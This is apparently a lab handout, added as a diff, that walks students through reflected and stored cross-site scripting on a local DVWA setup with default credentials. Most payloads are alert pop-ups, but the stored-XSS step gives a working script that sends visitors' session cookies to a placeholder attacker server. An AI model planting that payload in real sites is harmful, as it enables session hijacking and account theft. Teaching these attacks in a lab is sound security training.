@@ -1,0 +1,34 @@
+ Cross-Site Scripting Attack 
+The objective is to inject malicious client-side execution code (usually JavaScript) into a web page viewed by other users.
+
+Step 1: Environment Setup
+1.	Access your local vulnerable web application (e.g., navigating to http://localhost/dvwa or a custom vulnerable PHP site provided in your lab).
+2.	Log in and navigate to the XSS (Stored) or XSS (Reflected) module. Ensure the application's security level is set to "Low" for the initial test.
+
+Step 2: Executing a Reflected XSS Attack Reflected XSS occurs when the injected script is immediately bounced (reflected) off the web server, such as in an error message or search result.
+1.	Locate an input vector, such as a "Search" bar or a URL parameter (e.g., ?name=).
+2.	Inject a basic Proof of Concept (PoC) payload to test for code execution:
+HTML
+<script>alert('XSS Vulnerability Confirmed');</script>
+3.	Submit the input. If the site is vulnerable, the browser will instantly execute the script and display a pop-up alert box.
+
+Step 3: Executing a Stored (Persistent) XSS Attack Stored XSS occurs when the payload is permanently saved on the target server (e.g., in a database, forum post, or comment section).
+1.	Navigate to a "Guestbook" or "Comments" section of the vulnerable app.
+2.	Inject a payload designed to steal session cookies:
+HTML
+<script>document.write('<img src="http://[Your_Attacker_IP]/log.php?cookie=' + document.cookie + '" style="display:none;" />');</script>
+3.	Submit the comment.
+4.	The Result: The payload is saved to the database. Whenever any user (including the admin) visits that specific comment page, their browser will silently execute the script, append their active session cookie to the image URL, and send it to your attacker server.
+
+Step 1: Open XAMPP and start Apache and MySQL
+Step 2: Go to Localhost: 8080/setup.php and login using username: admin; password: password.
+Step 3: Opens the DVWA home page. 
+Step 4: Once logged in we want to navigate to the DVWA Security tab, select “Low” in the drop-down
+box,and hit Submit
+Step 5: Stored Cross Site Scripting.
+Name : Student
+Message : hello
+Step 6: Reflected Cross Site Scripting
+<script>alert("Hello !, How are you ?")</script>
+"><script>alert('how are u')</script>
+<script>alert('Stored XSS Working!')</script>
